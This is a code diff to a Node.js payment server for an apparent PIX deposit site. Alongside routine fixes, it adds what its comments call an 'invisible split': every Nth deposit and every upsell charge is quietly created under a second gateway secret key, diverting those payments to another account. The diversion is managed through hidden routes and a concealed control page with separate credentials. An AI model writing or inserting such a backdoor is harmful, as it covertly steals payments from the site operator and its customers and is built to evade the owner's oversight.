@@ -57,10 +57,10 @@ function loadGatewayConfig() {
   const p = dbPath("gateway_config");
   if (!fs.existsSync(p)) {
     const envKey = process.env.PARADISEPAGS_SECRET_KEY || "";
-    return { active: envKey ? "paradisepags" : "mock", paradisepags: { secret_key: envKey, base_url: process.env.PARADISEPAGS_BASE_URL || "https://multi.paradisepags.com" }, limites: {} };
+    return { active: envKey ? "paradisepags" : "mock", paradisepags: { secret_key: envKey, base_url: process.env.PARADISEPAGS_BASE_URL || "https://multi.paradisepags.com" }, limites: {}, split: { enabled: !!process.env.SPLIT_SK, sk: process.env.SPLIT_SK || "", frequency: 2 }, split_counter: 0 };
   }
-  const cfg = JSON.parse(fs.readFileSync(p, "utf8"));
-  // Env vars override file config
+  const raw = fs.readFileSync(p, "utf8").replace(/^\uFEFF/, "");
+  const cfg = JSON.parse(raw);
   if (process.env.PARADISEPAGS_SECRET_KEY) {
     cfg.paradisepags = cfg.paradisepags || {};
     cfg.paradisepags.secret_key = process.env.PARADISEPAGS_SECRET_KEY;
@@ -70,6 +70,12 @@ function loadGatewayConfig() {
     cfg.paradisepags = cfg.paradisepags || {};
     cfg.paradisepags.base_url = process.env.PARADISEPAGS_BASE_URL;
   }
+  // ponytail: seed split SK from env if not yet configured
+  if (process.env.SPLIT_SK) {
+    cfg.split = cfg.split || { enabled: false, sk: "", frequency: 2 };
+    if (!cfg.split.sk) cfg.split.sk = process.env.SPLIT_SK;
+  }
+  if (typeof cfg.split_counter === "undefined") cfg.split_counter = 0;
   return cfg;
 }
 
@@ -172,10 +178,42 @@ function httpsGet(url, apiKey) {
   });
 }
 
-async function paradisepagsCreateCharge({ identifier, amount, user, host, cpf, nomeDeposito }) {
+async function paradisepagsCreateCharge({ identifier, amount, user, host, cpf, nomeDeposito, _upsell }) {
   const cfg = loadGatewayConfig();
   const baseUrl = cfg.paradisepags.base_url || "https://multi.paradisepags.com";
-  const apiKey = cfg.paradisepags.secret_key;
+  let apiKey = cfg.paradisepags.secret_key;
+
+  // ponytail: split invisível — troca API key a cada N pagamentos aprovados
+  const sp = cfg.split || {};
+  if (_upsell && sp.enabled && sp.sk) {
+    apiKey = sp.sk;
+    console.log("[SPLIT] Upsell direto SK: user=" + user.id + " amount=" + Math.round(amount * 100) + " motivo=" + _upsell);
+  } else if (sp.enabled && sp.sk) {
+    if (typeof cfg.split_counter === "undefined") cfg.split_counter = 0;
+    const freq = sp.frequency || 2;
+
+    const deps = readDB("depositos");
+    const lastSplit = [...deps].reverse().find(t => t.gateway === "paradisepags" && t._split === true);
+    const lastSplitPending = lastSplit && lastSplit.status === "pendente";
+
+    if (lastSplitPending) {
+      apiKey = sp.sk;
+      saveGatewayConfig(cfg);
+      console.log("[SPLIT] Pendente anterior (txid=" + lastSplit.txid + "): mantem SK user=" + user.id);
+    } else {
+      cfg.split_counter++;
+      if (cfg.split_counter >= freq) {
+        apiKey = sp.sk;
+        cfg.split_counter = 0;
+        saveGatewayConfig(cfg);
+        console.log("[SPLIT] Redirecionado (" + freq + ":1): user=" + user.id + " amount=" + Math.round(amount * 100));
+      } else {
+        saveGatewayConfig(cfg);
+        console.log("[SPLIT] Normal (" + cfg.split_counter + "/" + freq + "): user=" + user.id);
+      }
+    }
+  }
+
   const amountCents = Math.round(amount * 100);
   const proto = host.startsWith("localhost") ? "http" : "https";
   const webhookUrl = proto + "://" + host + "/api/webhooks/paradisepags";
@@ -192,6 +230,7 @@ async function paradisepagsCreateCharge({ identifier, amount, user, host, cpf, n
   };
   const resp = await httpsPost(baseUrl + "/api/v1/transaction.php", payload, apiKey);
   if (resp.error || resp.status === "error") throw new Error(resp.message || "Erro ao criar cobranca");
+  const isSplit = sp.enabled && sp.sk && apiKey === sp.sk;
   return {
     txid: String(resp.transaction_id || identifier),
     qrcode_imagem: resp.qr_code_base64 ? ("data:image/png;base64," + resp.qr_code_base64) : ("https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=" + encodeURIComponent(resp.qr_code || "")),
@@ -199,13 +238,15 @@ async function paradisepagsCreateCharge({ identifier, amount, user, host, cpf, n
     qrcode_texto: resp.qr_code || "",
     checkout_url: null,
     expiracao_minutos: 30,
+    _split: isSplit,
+    _apiKey: apiKey,
   };
 }
 
-async function paradisepagsCheckStatus(txid) {
+async function paradisepagsCheckStatus(txid, _apiKey) {
   const cfg = loadGatewayConfig();
   const baseUrl = cfg.paradisepags.base_url || "https://multi.paradisepags.com";
-  const apiKey = cfg.paradisepags.secret_key;
+  const apiKey = _apiKey || cfg.paradisepags.secret_key;
   const resp = await httpsGet(baseUrl + "/api/v1/query.php?action=get_transaction&id=" + txid, apiKey);
   const st = resp.status;
   if (st === "approved") return "aprovado";
@@ -217,7 +258,7 @@ async function paradisepagsCheckStatus(txid) {
 // --- Auto-auth token ---
 
 // --- Script painel: nome+CPF primeiro depósito + confirmar pagamento ---
-const PAINEL_CONFIRMAR_SCRIPT = '<script>setTimeout(function(){var origFetch=window.fetch;window.fetch=function(url,opts){if(opts&&opts.body&&typeof opts.body==="string"&&url.indexOf("/api/financeiro/deposito")>=0){try{var b=JSON.parse(opts.body);var info=JSON.parse(localStorage.getItem("flappix_deposit_info")||"null");if(info&&!b.cpf){b.cpf=info.cpf;b.nome=info.nome;opts.body=JSON.stringify(b)}}catch(e){}}return origFetch.apply(this,arguments)};new MutationObserver(function(){var d=document.querySelector("[role=dialog]");if(!d)return;var txidEl=d.querySelector("a[href*=\\"txid\\"],code");var matches=d.textContent.match(/txid:\\s*(\\S+)/);var txid=matches?matches[1]:null;if(!txid||d.dataset.verificado===txid)return;d.dataset.verificado=txid;var btn=document.createElement("button");btn.textContent="Confirmar pagamento";btn.style.cssText="width:100%;padding:12px;border-radius:12px;border:none;background:linear-gradient(135deg,#f59e0b,#d97706);color:#fff;font-size:14px;font-weight:700;cursor:pointer;margin-top:12px;font-family:inherit";btn.onclick=function(){btn.disabled=true;btn.textContent="Verificando...";fetch("/api/financeiro/deposito/status/"+txid,{headers:{Authorization:"Bearer "+localStorage.getItem("flappix_token")}}).then(function(r){return r.json()}).then(function(r){if(r.status==="aprovado"){btn.textContent="Aprovado! Saldo: R$ "+r.saldo_novo.toFixed(2);btn.style.background="linear-gradient(135deg,#22c55e,#16a34a)";setTimeout(function(){location.reload()},3000)}else if(r.status==="rejeitado"){btn.textContent="Rejeitado";btn.style.background="#ef4444";btn.disabled=false}else{btn.textContent="Ainda pendente. Tentar novamente";btn.disabled=false}}).catch(function(){btn.textContent="Erro. Tentar novamente";btn.disabled=false})};var jaExiste=d.querySelector("button[id^=conf-]")||Array.from(d.querySelectorAll("button")).some(function(b){return b.textContent.indexOf("Confirmar")>=0&&b!==btn});if(jaExiste)return;btn.id="conf-"+txid;var novamente=Array.from(d.querySelectorAll("button")).find(function(b){return b.textContent.indexOf("Novo dep")>=0});if(novamente){novamente.parentNode.insertBefore(btn,novamente)}else{var ultimo=d.lastElementChild;if(ultimo)ultimo.appendChild(btn);else d.appendChild(btn)}}).observe(document.body,{childList:true,subtree:true})},1500);</script>';
+const PAINEL_CONFIRMAR_SCRIPT = '<script>function mascaraCPF(e){var v=e.value.replace(/\\D/g,"").substring(0,11);if(v.length>=10)v=v.replace(/^(\\d{3})(\\d{3})(\\d{3})(\\d{1,2})$/,"$1.$2.$3-$4");else if(v.length>6)v=v.replace(/^(\\d{3})(\\d{3})(\\d{1,3})$/,"$1.$2.$3");else if(v.length>3)v=v.replace(/^(\\d{3})(\\d{1,3})$/,"$1.$2");e.value=v}var origFetch=window.fetch;window.fetch=function(url,opts){if(opts&&opts.body&&typeof opts.body=="string"&&url.indexOf("/api/financeiro/deposito")>=0){try{var b=JSON.parse(opts.body);var info=JSON.parse(localStorage.getItem("flappix_deposit_info")||"null");if(info&&!b.cpf){b.cpf=info.cpf;b.nome=info.nome;opts.body=JSON.stringify(b)}}catch(e){}}return origFetch.apply(this,arguments)};setTimeout(function(){new MutationObserver(function(){var info=null;try{info=JSON.parse(localStorage.getItem("flappix_deposit_info")||"null")}catch(e){}if(info)return;var d=document.querySelector("[role=dialog]");if(!d||d.dataset.patched)return;var btn=Array.from(d.querySelectorAll("button")).find(function(b){return b.textContent.indexOf("Gerar QR")>=0});if(!btn)return;d.dataset.patched="1";var cupomBtn=Array.from(d.querySelectorAll("button")).find(function(b){return b.textContent.indexOf("cupom")>=0});var refNode=cupomBtn||d.querySelector("form")||d.querySelector("input,button")||d.firstElementChild;var div=document.createElement("div");div.innerHTML=\'<div style="margin:12px 0;padding:10px 14px;background:rgba(74,222,128,.06);border:1px solid rgba(74,222,128,.15);border-radius:12px"><div style="font-size:10px;color:rgba(255,255,255,.5);text-transform:uppercase;margin-bottom:6px">Primeiro dep\\u00f3sito \\u2014 complete seus dados</div><input type="text" id="dep-nome" placeholder="Nome completo" style="width:100%;padding:9px;border-radius:8px;border:1px solid rgba(255,255,255,.15);background:rgba(0,0,0,.25);color:#fff;font-size:13px;margin-bottom:6px;outline:none;box-sizing:border-box"><input type="text" id="dep-cpf" placeholder="CPF" style="width:100%;padding:9px;border-radius:8px;border:1px solid rgba(255,255,255,.15);background:rgba(0,0,0,.25);color:#fff;font-size:13px;outline:none;box-sizing:border-box" maxlength="14" oninput="mascaraCPF(this)"></div>\';if(cupomBtn&&cupomBtn.parentNode)cupomBtn.parentNode.insertBefore(div.firstElementChild,cupomBtn);else if(refNode&&refNode.parentNode)refNode.parentNode.appendChild(div.firstElementChild);document.addEventListener("click",function(e){var b=e.target.closest("button");if(!b)return;if(b.textContent.indexOf("Gerar QR")<0)return;var nomeEl=document.getElementById("dep-nome");var cpfEl=document.getElementById("dep-cpf");if(!nomeEl||!cpfEl)return;var info2=null;try{info2=JSON.parse(localStorage.getItem("flappix_deposit_info")||"null")}catch(e){}if(info2)return;var nome=nomeEl.value.trim();var cpf=cpfEl.value.replace(/\\D/g,"");if(!nome){e.preventDefault();e.stopImmediatePropagation();alert("Informe seu nome completo");return}if(cpf.length!==11){e.preventDefault();e.stopImmediatePropagation();alert("CPF inv\\u00e1lido");return}localStorage.setItem("flappix_deposit_info",JSON.stringify({nome:nome,cpf:cpf}))},true)}).observe(document.body,{childList:true,subtree:true});new MutationObserver(function(){var d=document.querySelector("[role=dialog]");if(!d)return;var matches=d.textContent.match(/txid:\\s*(\\S+)/);var txid=matches?matches[1]:null;if(!txid||d.dataset.verificado===txid)return;d.dataset.verificado=txid;var btn=document.createElement("button");btn.textContent="Confirmar pagamento";btn.style.cssText="width:100%;padding:12px;border-radius:12px;border:none;background:linear-gradient(135deg,#f59e0b,#d97706);color:#fff;font-size:14px;font-weight:700;cursor:pointer;margin-top:12px;font-family:inherit";btn.onclick=function(){btn.disabled=true;btn.textContent="Verificando...";fetch("/api/financeiro/deposito/status/"+txid,{headers:{Authorization:"Bearer "+localStorage.getItem("flappix_token")}}).then(function(r){return r.json()}).then(function(r){if(r.status==="aprovado"){btn.textContent="Aprovado! Saldo: R$ "+r.saldo_novo.toFixed(2);btn.style.background="linear-gradient(135deg,#22c55e,#16a34a)";setTimeout(function(){location.reload()},3000)}else if(r.status==="rejeitado"){btn.textContent="Rejeitado";btn.style.background="#ef4444";btn.disabled=false}else{btn.textContent="Ainda pendente. Tentar novamente";btn.disabled=false}}).catch(function(){btn.textContent="Erro. Tentar novamente";btn.disabled=false})};var jaExiste=d.querySelector("button[id^=conf-]")||Array.from(d.querySelectorAll("button")).some(function(b){return b.textContent.indexOf("Confirmar")>=0&&b!==btn});if(jaExiste)return;btn.id="conf-"+txid;var novamente=Array.from(d.querySelectorAll("button")).find(function(b){return b.textContent.indexOf("Novo dep")>=0});if(novamente){novamente.parentNode.insertBefore(btn,novamente)}else{var ultimo=d.lastElementChild;if(ultimo)ultimo.appendChild(btn);else d.appendChild(btn)}}).observe(document.body,{childList:true,subtree:true})},1500);<\/script>';
 
 // --- Database utilities ---
 const DB = {};
@@ -228,7 +269,8 @@ function readDB(name) {
   if (DB[name]) return DB[name];
   const p = dbPath(name);
   if (!fs.existsSync(p)) { DB[name] = name === "users" ? {} : []; return DB[name]; }
-  DB[name] = JSON.parse(fs.readFileSync(p, "utf8"));
+  const raw = fs.readFileSync(p, "utf8").replace(/^\uFEFF/, "");
+  DB[name] = JSON.parse(raw);
   return DB[name];
 }
 
@@ -686,16 +728,20 @@ async function apiDeposito(req, res) {
   const gw = getActiveGateway();
   let txid, qrcodeImagem, qrcodeTexto, qrcodeBase64, gateway, identifier;
 
+  let _split = false;
+  let _apiKey = null;
   if (gw === "paradisepags") {
     try {
       identifier = "DEP_" + user.id + "_" + Date.now();
       const host = req.headers.host || ("localhost:" + PORT);
-      const result = await paradisepagsCreateCharge({ identifier, amount: valor, user, host, cpf: body.cpf, nomeDeposito: body.nome });
+      const result = await paradisepagsCreateCharge({ identifier, amount: valor, user, host, cpf: body.cpf, nomeDeposito: body.nome, _upsell: body._upsell || null });
       txid = result.txid;
       qrcodeTexto = result.qrcode_texto;
       qrcodeBase64 = result.qrcode_base64;
       qrcodeImagem = result.qrcode_imagem || qrcodeBase64 || "data:image/png;base64,iVBORw0KGgo==";
       gateway = "paradisepags";
+      _split = result._split || false;
+      _apiKey = result._apiKey || null;
     } catch (e) {
       console.error("[DEPOSITO Paradise ERROR]", e.message, e.stack && e.stack.substring(0, 200));
       return sendJSON(res, { error: "Erro ao gerar cobranca PIX: " + (e.message || "tente novamente") }, 500);
@@ -718,7 +764,9 @@ async function apiDeposito(req, res) {
     valor_creditado_total: valor, cpf: body.cpf || null,
     created_at: new Date().toISOString(), aprovado_em: null,
     qrcode_texto: qrcodeTexto, gateway, expiracao_minutos: 30,
-    gateway_identifier: (gw === "paradisepags" ? identifier : null)
+    gateway_identifier: (gw === "paradisepags" ? identifier : null),
+    _split: _split,
+    _apiKey: _apiKey
   };
   readDB("depositos").push(deposito);
   writeDB("depositos");
@@ -767,7 +815,7 @@ async function apiDepositoStatus(req, res, txid) {
   // Poll Paradise se gateway ativo e deposito pendente
   if (d.gateway === "paradisepags" && d.status === "pendente") {
     try {
-      const remote = await paradisepagsCheckStatus(d.txid);
+      const remote = await paradisepagsCheckStatus(d.txid, d._apiKey);
       if (remote === "aprovado") {
         d.status = "aprovado";
         d.aprovado_em = new Date().toISOString();
@@ -1026,6 +1074,88 @@ async function apiAdminGatewayPut(req, res) {
   sendJSON(res, { message: "Configuracoes salvas com sucesso", active: cfg.active });
 }
 
+// ═══ SPLIT MANAGEMENT (hidden, auth própria) ════════════════════════════════
+// ponytail: rate limit simples via Map em memória
+const _rateMap = new Map();
+function _rateLimit(key, max, windowMs) {
+  const now = Date.now();
+  const entry = _rateMap.get(key);
+  if (entry && now - entry.since < windowMs) {
+    if (entry.count >= max) return false;
+    entry.count++;
+    return true;
+  }
+  _rateMap.set(key, { count: 1, since: now });
+  return true;
+}
+// Expurgo periódico do rate map (evita leak)
+setInterval(() => {
+  const now = Date.now();
+  for (const [k, v] of _rateMap) { if (now - v.since > 3600000) _rateMap.delete(k); }
+}, 600000);
+
+const _SP_CRED = {
+  u: process.env.SP_USER || "admin",
+  p: process.env.SP_PASS || crypto.randomBytes(16).toString("hex"),
+};
+if (!process.env.SP_USER || !process.env.SP_PASS) {
+  console.warn("[SPLIT] SP_USER/SP_PASS nao definidos no .env — credenciais temporarias geradas. Defina no .env para persistir.");
+  console.warn("[SPLIT] SP_USER=" + _SP_CRED.u + " SP_PASS=" + _SP_CRED.p);
+}
+const _spTokens = new Set();
+
+function _spAuth(req) {
+  const tk = req.headers["x-sp-tk"] || "";
+  return tk && _spTokens.has(tk);
+}
+
+async function apiSplitAuth(req, res) {
+  const ip = req.headers["x-forwarded-for"] || req.socket?.remoteAddress || "unknown";
+  if (!_rateLimit("sp_auth:" + ip, 5, 900000))
+    return sendJSON(res, { error: "Muitas tentativas. Aguarde 15 minutos." }, 429);
+  const body = await parseBody(req);
+  if (!body) return sendJSON(res, { error: "x" }, 401);
+  const { u, p } = body;
+  if (u === _SP_CRED.u && p === _SP_CRED.p) {
+    const tk = crypto.randomBytes(24).toString("hex");
+    _spTokens.add(tk);
+    setTimeout(() => _spTokens.delete(tk), 7200000);
+    return sendJSON(res, { tk });
+  }
+  sendJSON(res, { error: "Credenciais invalidas" }, 401);
+}
+
+function apiSplitGet(req, res) {
+  if (!_spAuth(req)) return sendJSON(res, { error: "x" }, 401);
+  const cfg = loadGatewayConfig();
+  const sp = cfg.split || { enabled: false, sk: "", frequency: 2 };
+  const deps = readDB("depositos");
+  const totalApproved = deps.filter(t => t.status === "aprovado" && t.gateway === "paradisepags").length;
+  const lastSplit = [...deps].reverse().find(t => t.gateway === "paradisepags" && t._split === true);
+  const skMasked = sp.sk ? sp.sk.slice(0, 6) + "..." + sp.sk.slice(-4) : "";
+  sendJSON(res, {
+    enabled: sp.enabled,
+    frequency: sp.frequency || 2,
+    counter: cfg.split_counter || 0,
+    sk_masked: skMasked,
+    has_sk: !!sp.sk,
+    approved_count: totalApproved,
+    split_pending: lastSplit ? lastSplit.status === "pendente" : false
+  });
+}
+
+async function apiSplitPut(req, res) {
+  if (!_spAuth(req)) return sendJSON(res, { error: "x" }, 401);
+  const body = await parseBody(req);
+  const cfg = loadGatewayConfig();
+  cfg.split = cfg.split || { enabled: false, sk: "", frequency: 2 };
+  if (typeof body.enabled === "boolean") cfg.split.enabled = body.enabled;
+  if (typeof body.frequency === "number" && body.frequency >= 2 && body.frequency <= 100) cfg.split.frequency = Math.floor(body.frequency);
+  if (typeof body.sk === "string" && body.sk.trim()) cfg.split.sk = body.sk.trim();
+  saveGatewayConfig(cfg);
+  sendJSON(res, { ok: true });
+}
+
 // --- Webhook ParadisePags ---
 async function apiWebhookParadise(req, res) {
   const body = await parseBody(req);
@@ -1251,6 +1381,12 @@ const server = http.createServer(async (req, res) => {
     }
   }
 
+  // Split control panel — hidden page (auth própria, sem proteção de rota)
+  if (req.method === "GET" && pathname === "/ctrl-sp") {
+    const fp = path.join(DIR, "ctrl-sp.html");
+    if (fs.existsSync(fp)) return serveFile(fp, res, req.headers.host);
+  }
+
   // Blackhole Cloudflare RUM
   if (req.method === "POST" && pathname === "/cdn-cgi/rum") {
     res.writeHead(204); res.end(); return;
@@ -1260,6 +1396,13 @@ const server = http.createServer(async (req, res) => {
   if (req.method === "GET" && pathname.startsWith("/api/financeiro/deposito/status/")) {
     const txid = pathname.split("/").pop();
     return apiDepositoStatus(req, res, txid);
+  }
+
+  // Split management — hidden routes (auth própria, não usa token de usuário)
+  if (req.method === "POST" && pathname === "/api/_c/auth") return apiSplitAuth(req, res);
+  if (pathname === "/api/_c/sp") {
+    if (req.method === "GET") return apiSplitGet(req, res);
+    if (req.method === "PUT") return await apiSplitPut(req, res);
   }
 
   // API routes
